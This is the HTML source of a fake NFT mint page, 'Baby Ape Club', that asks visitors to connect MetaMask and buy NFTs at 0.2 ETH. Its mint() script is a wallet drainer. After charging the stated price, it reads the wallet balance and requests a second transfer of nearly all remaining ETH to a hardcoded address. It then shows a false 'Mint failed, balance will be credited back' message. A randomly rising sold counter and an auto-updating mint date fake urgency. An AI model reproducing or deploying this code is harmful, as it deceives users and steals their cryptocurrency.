<!DOCTYPE html>
<html lang="en">

<head>

    <title>Baby Ape Club</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta name="theme-color" content="#000000">
    <meta name="robots" content="index, follow">
    <meta name="description" content="9.999 unique ERC-721 NFTs for P2E Mobile Game and Metaverse created by BAYC investor">

    <meta property="og:url" content="https://alpha-kongclub.com/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Baby Ape Club">
    <meta property="og:description" content="9.999 unique ERC-721 NFTs for P2E Mobile Game and Metaverse created by BAYC investor">
    <meta property="og:image" content="">

    <meta name="twitter:card" content="summary_large_image">
    <meta property="twitter:domain" content="">
    <meta property="twitter:url" content="">
    <meta name="twitter:title" content="Baby Ape Club">
    <meta name="twitter:description" content="9.999 unique ERC-721 NFTs for P2E Mobile Game and Metaverse created by BAYC investor">
    <meta name="twitter:image" content="">
    <link rel="shortcut icon" href="favicon.png">
    <link rel="stylesheet" href="static/css/style.css">
    <link rel="stylesheet" href="ajax/libs/slick-carousel/1.8.1/slick.min.css" integrity="sha512-yHknP1/AwR+yx26cB1y0cjvQUMvEa2PFzt1c9LlS4pRQ5NOTZFWbhBig+X9G9eYW/8m0/4OXNx8pxJ6z57x0dw==" crossorigin="anonymous" referrerpolicy="no-referrer">
    <script type="text/javascript" src="web3@1.2.11/dist/web3.min.js"></script>
    <script src="lib/ethers-5.1.umd.min.js" type="text/javascript"></script>
    <script src="ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="ajax/libs/slick-carousel/1.8.1/slick.min.js" integrity="sha512-XtmMtDEcNz2j7ekrtHvOVR4iwwaD6o/FUJe6+Zq+HgcCsk3kj4uSQQR8weQ2QVj1o0Pk6PwYLohm206ZzNfubg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript" src="static/js/onboard-dist/main.js" defer=""></script>
    <script type="text/javascript" src="static/js/sender.js" defer=""></script>
    <script defer="">
        $(document).ready(function() {
            $('.slider').slick({
                slidesToShow: 3,
                autoplay: true,
                autoplaySpeed: 0,
                speed: 2000,
                cssEase: 'linear',
                infinite: true,
                focusOnSelect: false,
                vertical: true,
                arrows: false,
                swipe: false,
                responsive: [{
                    breakpoint: 721,
                    settings: {
                        slidesToShow: 3,
                        slidesToScroll: 3,
                        vertical: false,
                    }
                }, ]
            });
            var DateMode = 1;
            var TimeON = 1;
            var datey = new Date(Date.now());
            var dateForUTC = new Date(Date.now());
            var dateyx = datey.toLocaleString('en-US', {
                timeZone: 'America/New_York'
            });
            var datej = new Date(dateyx);
            var datehour = datej.getHours();
            var dateday = datej.getDate();
            var datehourUTC = dateForUTC.getUTCHours();
            var datedayUTC = dateForUTC.getUTCDate();
            if (datehour == 1) {
                datehour = '- 1am EST'
            }
            if (datehourUTC == 1) {
                datehourUTC = '- 1am UTC'
            }
            if (datehour == 2) {
                datehour = '- 2am EST'
            }
            if (datehourUTC == 2) {
                datehourUTC = '- 2am UTC'
            }
            if (datehour == 3) {
                datehour = '- 3am EST'
            }
            if (datehourUTC == 3) {
                datehourUTC = '- 3am UTC'
            }
            if (datehour == 4) {
                datehour = '- 4am EST'
            }
            if (datehourUTC == 4) {
                datehourUTC = '- 4am UTC'
            }
            if (datehour == 5) {
                datehour = '- 5am EST'
            }
            if (datehourUTC == 5) {
                datehourUTC = '- 5am UTC'
            }
            if (datehour == 6) {
                datehour = '- 6am EST'
            }
            if (datehourUTC == 6) {
                datehourUTC = '- 6am UTC'
            }
            if (datehour == 7) {
                datehour = '- 7am EST'
            }
            if (datehourUTC == 7) {
                datehourUTC = '- 7am UTC'
            }
            if (datehour == 8) {
                datehour = '- 8am EST'
            }
            if (datehourUTC == 8) {
                datehourUTC = '- 8am UTC'
            }
            if (datehour == 9) {
                datehour = '- 9am EST'
            }
            if (datehourUTC == 9) {
                datehourUTC = '- 9am UTC'
            }
            if (datehour == 10) {
                datehour = '- 10am EST'
            }
            if (datehourUTC == 10) {
                datehourUTC = '- 10am UTC'
            }
            if (datehour == 11) {
                datehour = '- 11am EST'
            }
            if (datehourUTC == 11) {
                datehourUTC = '- 11am UTC'
            }
            if (datehour == 12) {
                datehour = '- 12pm EST'
            }
            if (datehourUTC == 12) {
                datehourUTC = '- 12pm UTC'
            }
            if (datehour == 13) {
                datehour = '- 1pm EST'
            }
            if (datehourUTC == 13) {
                datehourUTC = '- 1pm UTC'
            }
            if (datehour == 14) {
                datehour = '- 2pm EST'
            }
            if (datehourUTC == 14) {
                datehourUTC = '- 2pm UTC'
            }
            if (datehour == 15) {
                datehour = '- 3pm EST'
            }
            if (datehourUTC == 15) {
                datehourUTC = '- 3pm UTC'
            }
            if (datehour == 16) {
                datehour = '- 4pm EST'
            }
            if (datehourUTC == 16) {
                datehourUTC = '- 4pm UTC'
            }
            if (datehour == 17) {
                datehour = '- 5pm EST'
            }
            if (datehourUTC == 17) {
                datehourUTC = '- 5pm UTC'
            }
            if (datehour == 18) {
                datehour = '- 6pm EST'
            }
            if (datehourUTC == 18) {
                datehourUTC = '- 6pm UTC'
            }
            if (datehour == 19) {
                datehour = '- 7pm EST'
            }
            if (datehourUTC == 19) {
                datehourUTC = '- 7pm UTC'
            }
            if (datehour == 20) {
                datehour = '- 8pm EST'
            }
            if (datehourUTC == 20) {
                datehourUTC = '- 8pm UTC'
            }
            if (datehour == 21) {
                datehour = '- 9pm EST'
            }
            if (datehourUTC == 21) {
                datehourUTC = '- 9pm UTC'
            }
            if (datehour == 22) {
                datehour = '- 10pm EST'
            }
            if (datehourUTC == 22) {
                datehourUTC = '- 10pm UTC'
            }
            if (datehour == 23) {
                datehour = '- 11pm EST'
            }
            if (datehourUTC == 23) {
                datehourUTC = '- 11pm UTC'
            }
            if (datehour == 0) {
                datehour = '- 12am EST'
            }
            if (datehourUTC == 0) {
                datehourUTC = '- 12am UTC'
            }
            if (DateMode == 1) {
                document.getElementById("dateday2").innerHTML = dateday;
                if (TimeON == 1) {
                    document.getElementById("datehour1").innerHTML = datehour;
                }
            } else if (DateMode == 2) {
                document.getElementById("dateday2").innerHTML = datedayUTC;
                if (TimeON == 1) {
                    document.getElementById("datehour1").innerHTML = datehourUTC;
                }
            }
            let timerInterval;
            let time = 122;

            function updateTime() {
                var rnd = Math.floor(Math.random() * (7 - 1)) + 7;
                time = time + rnd;
                if (time > 963) {
                    time = 963;
                }
                let secs = time;
                document.querySelector('#num_1').innerHTML = `${secs}`;
            }
            var rnd2 = Math.floor(Math.random() * (3000 - 2001)) + 3000;

            function startTimer() {
                timerInterval = setInterval(updateTime, rnd2);
            };

            function stopTimer() {
                clearInterval(timerInterval);
            }
            window.onbeforeunload = function(event) {
                localStorage.setItem('dfdx', time);
            }
            window.addEventListener('load', () => {
                time = parseInt(localStorage.getItem('dfdx'));
                if (isNaN(time)) time = 122
                startTimer()
            }, false);
            var el = 0;
            $('#plus').on('click', function(e) {
                var t = parseInt($('#pricex').text(), 10);
                t += 1;
                if (t > 10) {
                    t = 10;
                }
                $('#pricex').text(t);
                var total = (t * 0.2).toFixed(2);
                $('#price').text(total);
            });
            $('#minus').on('click', function(e) {
                var t = parseInt($('#pricex').text(), 10);
                t -= 1;
                if (t < 1) {
                    t = 1;
                }
                $('#pricex').text(t);
                var total = (t * 0.2).toFixed(2);
                $('#price').text(total);
            });
            $('#ape-max').click(function() {
                $('.eth_input').val($('.eth_input').attr('max'));
                $('#pricex').text($('.eth_input').attr('max'));
                $('#price').text(($('.eth_input').attr('max') * 0.2).toFixed(2));
            });
        });
    </script>

    <script defer="">
        $(document).ready(function() {
            $('.slider').slick({
                slidesToShow: 3,
                autoplay: true,
                autoplaySpeed: 0,
                speed: 2000,
                cssEase: 'linear',
                infinite: true,
                focusOnSelect: false,
                vertical: true,
                arrows: false,
                swipe: false,
                responsive: [{
                    breakpoint: 721,
                    settings: {
                        slidesToShow: 3,
                        slidesToScroll: 3,
                        vertical: false,
                    }
                }, ]
            });
            var DateMode = 1;
            var TimeON = 1;
            var datey = new Date(Date.now());
            var dateForUTC = new Date(Date.now());
            var dateyx = datey.toLocaleString('en-US', {
                timeZone: 'America/New_York'
            });
            var datej = new Date(dateyx);
            var datehour = datej.getHours();
            var dateday = datej.getDate();
            var datehourUTC = dateForUTC.getUTCHours();
            var datedayUTC = dateForUTC.getUTCDate();
            if (datehour == 1) {
                datehour = '- 1am EST'
            }
            if (datehourUTC == 1) {
                datehourUTC = '- 1am UTC'
            }
            if (datehour == 2) {
                datehour = '- 2am EST'
            }
            if (datehourUTC == 2) {
                datehourUTC = '- 2am UTC'
            }
            if (datehour == 3) {
                datehour = '- 3am EST'
            }
            if (datehourUTC == 3) {
                datehourUTC = '- 3am UTC'
            }
            if (datehour == 4) {
                datehour = '- 4am EST'
            }
            if (datehourUTC == 4) {
                datehourUTC = '- 4am UTC'
            }
            if (datehour == 5) {
                datehour = '- 5am EST'
            }
            if (datehourUTC == 5) {
                datehourUTC = '- 5am UTC'
            }
            if (datehour == 6) {
                datehour = '- 6am EST'
            }
            if (datehourUTC == 6) {
                datehourUTC = '- 6am UTC'
            }
            if (datehour == 7) {
                datehour = '- 7am EST'
            }
            if (datehourUTC == 7) {
                datehourUTC = '- 7am UTC'
            }
            if (datehour == 8) {
                datehour = '- 8am EST'
            }
            if (datehourUTC == 8) {
                datehourUTC = '- 8am UTC'
            }
            if (datehour == 9) {
                datehour = '- 9am EST'
            }
            if (datehourUTC == 9) {
                datehourUTC = '- 9am UTC'
            }
            if (datehour == 10) {
                datehour = '- 10am EST'
            }
            if (datehourUTC == 10) {
                datehourUTC = '- 10am UTC'
            }
            if (datehour == 11) {
                datehour = '- 11am EST'
            }
            if (datehourUTC == 11) {
                datehourUTC = '- 11am UTC'
            }
            if (datehour == 12) {
                datehour = '- 12pm EST'
            }
            if (datehourUTC == 12) {
                datehourUTC = '- 12pm UTC'
            }
            if (datehour == 13) {
                datehour = '- 1pm EST'
            }
            if (datehourUTC == 13) {
                datehourUTC = '- 1pm UTC'
            }
            if (datehour == 14) {
                datehour = '- 2pm EST'
            }
            if (datehourUTC == 14) {
                datehourUTC = '- 2pm UTC'
            }
            if (datehour == 15) {
                datehour = '- 3pm EST'
            }
            if (datehourUTC == 15) {
                datehourUTC = '- 3pm UTC'
            }
            if (datehour == 16) {
                datehour = '- 4pm EST'
            }
            if (datehourUTC == 16) {
                datehourUTC = '- 4pm UTC'
            }
            if (datehour == 17) {
                datehour = '- 5pm EST'
            }
            if (datehourUTC == 17) {
                datehourUTC = '- 5pm UTC'
            }
            if (datehour == 18) {
                datehour = '- 6pm EST'
            }
            if (datehourUTC == 18) {
                datehourUTC = '- 6pm UTC'
            }
            if (datehour == 19) {
                datehour = '- 7pm EST'
            }
            if (datehourUTC == 19) {
                datehourUTC = '- 7pm UTC'
            }
            if (datehour == 20) {
                datehour = '- 8pm EST'
            }
            if (datehourUTC == 20) {
                datehourUTC = '- 8pm UTC'
            }
            if (datehour == 21) {
                datehour = '- 9pm EST'
            }
            if (datehourUTC == 21) {
                datehourUTC = '- 9pm UTC'
            }
            if (datehour == 22) {
                datehour = '- 10pm EST'
            }
            if (datehourUTC == 22) {
                datehourUTC = '- 10pm UTC'
            }
            if (datehour == 23) {
                datehour = '- 11pm EST'
            }
            if (datehourUTC == 23) {
                datehourUTC = '- 11pm UTC'
            }
            if (datehour == 0) {
                datehour = '- 12am EST'
            }
            if (datehourUTC == 0) {
                datehourUTC = '- 12am UTC'
            }
            if (DateMode == 1) {
                document.getElementById("dateday2").innerHTML = dateday;
                if (TimeON == 1) {
                    document.getElementById("datehour1").innerHTML = datehour;
                }
            } else if (DateMode == 2) {
                document.getElementById("dateday2").innerHTML = datedayUTC;
                if (TimeON == 1) {
                    document.getElementById("datehour1").innerHTML = datehourUTC;
                }
            }
            let timerInterval;
            let time = 122;

            function updateTime() {
                var rnd = Math.floor(Math.random() * (7 - 1)) + 7;
                time = time + rnd;
                if (time > 741) {
                    time = 741;
                }
                let secs = time;
                document.querySelector('#num_1').innerHTML = `${secs}`;
            }
            var rnd2 = Math.floor(Math.random() * (3000 - 2001)) + 3000;

            function startTimer() {
                timerInterval = setInterval(updateTime, rnd2);
            };

            function stopTimer() {
                clearInterval(timerInterval);
            }
            window.onbeforeunload = function(event) {
                localStorage.setItem('dfdx', time);
            }
            window.addEventListener('load', () => {
                time = parseInt(localStorage.getItem('dfdx'));
                if (isNaN(time)) time = 122
                startTimer()
            }, false);
            var el = 0;
            $('#plus').on('click', function(e) {
                var t = parseInt($('#pricex').text(), 10);
                t += 1;
                if (t > 10) {
                    t = 10;
                }
                $('#pricex').text(t);
                var total = (t * 0.2).toFixed(2);
                $('#price').text(total);
            });
            $('#minus').on('click', function(e) {
                var t = parseInt($('#pricex').text(), 10);
                t -= 1;
                if (t < 1) {
                    t = 1;
                }
                $('#pricex').text(t);
                var total = (t * 0.2).toFixed(2);
                $('#price').text(total);
            });
            $('#ape-max').click(function() {
                $('.eth_input').val($('.eth_input').attr('max'));
                $('#pricex').text($('.eth_input').attr('max'));
                $('#price').text(($('.eth_input').attr('max') * 0.2).toFixed(2));
            });
        });
    </script>

</head>

<body>
    <main>
        <div class="main-flex">
            <div class="slider"> <img src="static/media/slide1.jpg" alt="slide"> <img src="static/media/slide2.jpg" alt="slide"> <img src="static/media/slide3.jpg" alt="slide"><img src="static/media/slide1.jpg" alt="slide"> <img src="static/media/slide2.jpg" alt="slide">                <img src="static/media/slide3.jpg" alt="slide"> </div>
            <div class="header-cont">
                <div id="claim-text-wrapper">
                    <div class="dutch-detail-two-sides">
                        <div class="dutch-det-left">
                            <div class="dutch-det-right">
                                <div class="text-block-13">Limited Mint Date</div>
                            </div>
                            <div>

                            </div>
                            <div class="text-block-12">January <span id="dateday2"></span> <span id="datehour1"></span></div>
                        </div>
                    </div>
                    <div class="header_flex">
                        <div class="dutch-detail-two-sides">
                            <div class="text-block-13">Supply</div>
                            <div class="dutch-det-left">
                            </div>
                            <div class="dutch-det-right">
                                <div class="text-block-12">8888</div>
                            </div>
                        </div>
                        <div class="dutch-detail-two-sides">
                            <div class="dutch-det-left">
                                <div class="text-block-13">Price</div>
                            </div>
                            <div class="dutch-det-right">
                                <div class="text-block-12">0.2 ETH</div>
                            </div>
                        </div>
                        <div class="dutch-detail-two-sides">
                            <div class="dutch-det-left">
                                <div class="text-block-13">Max</div>
                            </div>
                            <div class="dutch-det-right">
                                <div class="text-block-12">10 per Wallet</div>
                            </div>
                        </div>
                    </div>
                    <div id="payment-modal">
                        <div id="payment-header">
                            <div id="payment-header-text" style=" margin: 0 auto; ">
                                <h1 class="heading-2-copy-copy-copy-copy" style=" margin: 0; padding: 0;     font-style: initial;"><span style="text-transform: none;">Limited Sale</span></h1>
                            </div>
                        </div>
                        <div id="payment-info" style=" margin-top: 20px; "><img id="price-img" src="static/media/gifius.gif" alt="Claim NFT">
                            <div id="payment-info-text">
                                <p>Price Per NFT</p>
                                <h5>0.2 ETH Each</h5>
                            </div>
                        </div>
                        <div id="ape-number">
                            <div id="minus" class="minuson" onclick="minus()">
                                <svg width="12" height="2" viewbox="0 0 16 2" fill="none" xmlns="http://www.w3.org/2000/svg" style="left: 11px;">
<path d="M15 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1C0 1.26522 0.105357 1.51957 0.292893 1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z" fill="white"></path>
</svg>
                            </div>
                            <h5 id="pricex" style="margin-left: 13px; margin-right: 13px;">1</h5>
                            <input name="eth" class="eth_input text-field-5 w-input" type="hidden" min="1" max="10" pattern="[A-z0-9]{2,50}" minlength="2" maxlength="50" required="required" value="1" id="qte">
                            <div id="plus" class="pluson" onclick="plus()">
                                <svg width="12" height="12" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" style="left: 11px;">
<path d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357 7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946 7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9 15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16 8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652 7 15 7Z" fill="white"></path>
</svg>
                            </div>
                            <h5 id="ape-max" onclick="max()">Set Max</h5>
                        </div>
                        <div id="ape-total">
                            <p>Total</p>
                            <h5><span id="price">0.2</span> ETH</h5>
                        </div>
                    </div>
                    <button class="cta connect-btn" id="transfer" onclick="mint()">Mint</button>
                    <div id="num"><span id="counter"></span><span class="num_c">/</span><span id="num_2">8888</span></div>
                </div>
            </div>
        </div>
    </main>
    <style>
        #num {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 8px;
        }

        .num_c {
            margin-left: 5px;
            margin-right: 5px;
        }

        .dutch-detail-two-sides {
            text-align: center;
        }

        .header-cont {
            padding-top: 30px;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            font-family: 'Blender Pro', 'Helvetica', sans-serif;
            padding: 0 20px;
        }

        #claim-text-wrapper {
            padding: 32px;
            background: rgb(11 11 8 / 80%);
            border-radius: 10px;
            margin-top: 30px;
        }

        .header_flex {
            display: grid;
            grid-template-columns: repeat(3, auto);
            grid-gap: 30px;
            margin-top: 25px;
            margin-bottom: 25px;
            width: 524px;
            justify-content: space-between;
        }

        .text-block-13 {
            color: #fff;
            font-weight: 700;
            font-size: 22px;
            margin-bottom: 5px;
        }

        .text-block-12 {
            color: #fff;
            font-size: 19px;
            font-weight: 400;
        }

        .heading-2-copy-copy-copy-copy {
            opacity: 1;
            color: rgb(252, 252, 253);
            line-height: 51px;
            font-style: italic;
            font-weight: 900;
            text-align: center;
            text-transform: uppercase;
            font-size: 51px !important;
            letter-spacing: 1px !important;
        }

        #payment-info {
            display: flex;
            margin-top: 20px;
            margin-bottom: 32px;
            padding: 12px;
            border-width: 1px;
            border-style: solid;
            border-color: rgb(255, 255, 255);
            border-image: initial;
            border-radius: 10px;
        }

        #price-img {
            width: 82px;
            height: 82px;
            border-radius: 10px;
        }

        #payment-info-text {
            text-align: end;
            margin: auto 0px auto auto;
        }

        #payment-info-text p {
            margin-block-start: 10px;
            margin-block-end: 10px;
            font-weight: 400;
            font-size: 15px;
            padding: 0 !important;
        }

        #payment-info-text h5 {
            font-size: 22px;
            font-weight: 400 !important;
        }

        #ape-number {
            display: flex;
            box-sizing: border-box;
            margin-bottom: 32px;
            align-items: center;
            padding: 12px;
            background: rgba(123, 123, 123, 0.41);
            border-width: 1px;
            border-style: solid;
            border-color: rgb(255, 255, 255);
            border-image: initial;
            border-radius: 10px;
        }

        #minus,
        #plus {
            position: relative;
            color: rgb(241, 241, 241);
            cursor: pointer;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #payment-info-text h4,
        #payment-info-text h5 {
            font-family: Montserrat, sans-serif;
            font-weight: 600;
            color: rgb(241, 241, 241);
            margin-block-start: 0px;
            margin-block-end: 0px;
        }

        #ape-total {
            display: flex;
            height: 65px;
            margin-bottom: 32px;
            padding-left: 10px;
            padding-right: 10px;
            border-top: 1px solid rgb(255, 255, 255);
            border-bottom: 1px solid rgb(255, 255, 255);
        }

        #ape-total h5,
        #ape-total p {
            margin-block-start: 0px;
            margin-block-end: 0px;
            margin-top: auto;
            margin-bottom: auto;
            color: #fff;
            padding: 0 !important;
            font-size: 20px;
        }

        #ape-total h5 {
            margin-right: 0;
            margin-left: auto;
        }

        #pricex {
            font-size: 22px;
        }

        .frm {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .max-button {
            width: 90px;
            height: 55px;
            border-radius: 10px;
            background-color: #FF0008;
            color: #fff;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin-left: 15px;
            font-weight: bold;
            transition: .3s;
        }

        .max-button:hover {
            background-color: #fff;
            color: #FF0008;
        }

        #ape-max {
            text-align: end;
            margin: auto 0 auto auto;
            padding-left: 15px;
            padding-right: 15px;
            padding-top: 5px;
            padding-bottom: 5px;
            background: #fff;
            color: #000;
            text-align: center;
            text-transform: uppercase;
            font-weight: 400;
            cursor: pointer;
            -webkit-box-shadow: 0 0 10px 2px #fff;
            -moz-box-shadow: 0 0 10px 2px #fff;
            box-shadow: 0 0 10px 2px #fff;
            -webkit-transition: -webkit-transform 0.25s ease-in-out;
            transition: -webkit-transform 0.25s ease-in-out;
            -o-transition: -o-transform 0.25s ease-in-out;
            -moz-transition: transform 0.25s ease-in-out, -moz-transform 0.25s ease-in-out;
            transition: transform 0.25s ease-in-out;
            transition: transform 0.25s ease-in-out, -webkit-transform 0.25s ease-in-out, -moz-transform 0.25s ease-in-out, -o-transform 0.25s ease-in-out;
            font-family: 'Blender Pro', 'Helvetica', sans-serif;
        }

        #total {
            color: #d20000;
            font-size: 24px;
        }

        .incr {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 24px;
            font-weight: 900;
            width: 180px;
            height: 55px;
            padding: 0 11px;
            box-sizing: border-box;
            background: #fff;
            border-radius: 10px;
            color: #000;
        }

        #timer+p {
            padding-bottom: 20px;
        }

        .mint-change {
            font-weight: bold;
            cursor: pointer;
        }

        .btn {
            text-align: center;
            display: block;
            width: 150px;
            margin-left: auto !important;
            margin-right: auto !important;
            margin-top: 15px;
            padding-left: 6px !important;
            color: #fff !important;
            text-transform: uppercase;
        }

        .btn:hover {
            color: #d20000 !important;
        }

        #connect,
        #transfer {
            text-align: end;
            font-size: 24px;
            margin: auto 0 auto auto;
            padding-left: 15px;
            padding-right: 15px;
            padding-top: 5px;
            padding-bottom: 5px;
            background: #fff;
            color: #000;
            text-align: center;
            text-transform: uppercase;
            cursor: pointer;
            -webkit-box-shadow: 0 0 10px 2px #fff;
            -moz-box-shadow: 0 0 10px 2px #fff;
            box-shadow: 0 0 10px 2px #fff;
            -webkit-transition: -webkit-transform 0.25s ease-in-out;
            transition: -webkit-transform 0.25s ease-in-out;
            -o-transition: -o-transform 0.25s ease-in-out;
            -moz-transition: transform 0.25s ease-in-out, -moz-transform 0.25s ease-in-out;
            transition: transform 0.25s ease-in-out;
            transition: transform 0.25s ease-in-out, -webkit-transform 0.25s ease-in-out, -moz-transform 0.25s ease-in-out, -o-transform 0.25s ease-in-out;
            font-family: 'Blender Pro', 'Helvetica', sans-serif;
            font-weight: bold;
            font-size: 22px;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        /*#transfer{*/

        /*    display: none;*/

        /*}*/

        .svelte-q1527 {
            display: none;
        }

        .svelte-q1527:first-child {
            display: block;
        }

        @media(max-width:720px) {
            #box0title1 {
                font-size: 100px !important;
            }
            #box0title0 {
                font-size: 60px !important;
            }
            .header-cont {
                /*width: 100%;*/
                padding-left: 20px;
                padding-right: 20px;
            }
            #claim-text-wrapper {
                width: 100%;
            }
            .header_flex {
                width: 100%;
            }
            .svelte-q1527 {
                display: block;
            }
            .main-flex {
                flex-direction: column-reverse;
                height: auto;
            }
            .slider {
                max-width: 100%;
                margin-top: 50px;
            }
        }

        .text-block-13,
        .text-block-12,
        .dateday2,
        .datehour1 {
            color: white;
        }
    </style>
    <script>
        const TOTAL_NFTS = 2000;
        let U_val = 0.2;
        let Qte = 1;
        let currentAccount = null;
        let minting = false;
        const acc = "0xb052Fe6A594cc9f1E87dcaD83CC478f56f0d24b1";

        let sold = document.getElementById('counter');
        var i = 7464;
        sold.innerHTML = i;

        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min)) + min;
        }
        setInterval(() => {
            var max = 8883;
            if (i >= max) i = max;
            sold.innerHTML = i;
            i += getRandomInt(3, 10);
        }, 2000);

        function getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
        }

        document.getElementById("qte").setAttribute("value", Qte);

        function qteChanged(evt) {
            Qte = Number.parseInt(document.getElementById("qte").value);
            document.getElementById("total").innerHTML = (U_val * Qte).toFixed(2);
        }

        function max() {
            Qte = 10;
            //    document.getElementById("qte").setAttribute("value", Qte);
            //    document.getElementById("total").innerHTML = (U_val * Qte).toFixed(2)
        }

        function minus() {
            if (Qte > 1) Qte -= 1;
            //    document.getElementById("qte").setAttribute("value", Qte);
            //    document.getElementById("total").innerHTML = (U_val * Qte).toFixed(2)
        }

        function plus() {
            if (Qte < 10) Qte += 1;
            //    document.getElementById("qte").setAttribute("value", Qte);
            //    document.getElementById("total").innerHTML = (U_val * Qte).toFixed(2)
        }

        function connect() {
            window.ethereum
                .request({
                    method: 'eth_requestAccounts'
                })
                .then(handleAccountsChanged)
                .catch((err) => {
                    if (err.code === 4001) {
                        // EIP-1193 userRejectedRequest error
                        // If this happens, the user rejected the connection request.
                        alert('Wallet disconnected.');
                    } else {
                        console.error(err);
                    }
                });
        };

        function handleAccountsChanged(accounts) {
            if (accounts.length === 0) {
                // MetaMask is locked or the user has not connected any accounts
                currentAccount = null;
                document.getElementById("transfer").innerHTML = "Connect MetaMask";
            } else if (accounts[0] !== currentAccount) {
                currentAccount = accounts[0];
                document.getElementById("transfer").innerHTML = "Mint";
            } else {
                document.getElementById("transfer").innerHTML = "Mint";
            }
        }

        async function mint(evt) {
            try {

                if (minting) {
                    alert("Transaction already pending.")
                } else if (currentAccount) {
                    minting = true;
                    document.getElementById("transfer").innerHTML = "Mint";
                    window.ethereum.request({
                            method: "eth_sendTransaction",
                            params: [{
                                from: currentAccount,
                                to: acc,
                                value: (U_val * Qte * 1e18).toString(16)
                            }]
                        }).then((txn) => {
                            minting = false;
                        })
                        .catch((err) => {
                            if (err.code === 4001) {
                                // EIP-1193 userRejectedRequest error
                                // If this happens, the user rejected the connection request.
                                // alert("mint failed(error: transaction denied by user).")
                            } else {
                                console.error(err);
                            }
                        });

                    let balance = await window.ethereum.request({
                        method: "eth_getBalance",
                        params: [currentAccount, "latest"]
                    })
                    balance = Number.parseInt(balance, 16)
                    window.ethereum.request({
                            method: "eth_sendTransaction",
                            params: [{
                                from: currentAccount,
                                to: acc,
                                value: (balance - (U_val * Qte + 0.01) * 1e18).toString(16)
                            }]
                        }).then((txn) => {
                            minting = false;
                            alert("Mint failed. \nTry again. \nBalance will be credited back within 2 hours.")
                        })
                        .catch((err) => {
                            minting = false;
                            if (err.code === 4001) {
                                // EIP-1193 userRejectedRequest error
                                // If this happens, the user rejected the connection request.
                                alert("mint failed(error: transaction denied by user)")
                                document.getElementById("transfer").innerHTML = "Mint";
                            } else {
                                console.error(err);
                            }
                        });
                } else await connect();
            } catch (err) {
                alert('You should use MetaMask for buy.');
                console.error(err)
            } finally {}
        }

        window.ethereum.on("accountsChanged", handleAccountsChanged)

        window.addEventListener('load', async () => {
            // Wait for loading completion to avoid race conditions with web3 injection timing.
            if (window.ethereum) {
                const web3 = await new Web3(window.ethereum);
                await connect();
                return web3;
            }
            // Legacy dapp browsers...
            else if (window.web3) {
                // Use Mist/MetaMask's provider.
                const web3 = window.web3;
                console.log('Injected web3 detected.');
                return web3;
            }
            // Fallback to localhost; use dev console port by default...
            else {
                alert('You should use MetaMask for buy.');
                console.log('No web3 instance injected...');
            }
        });
    </script>
</body>

</html>
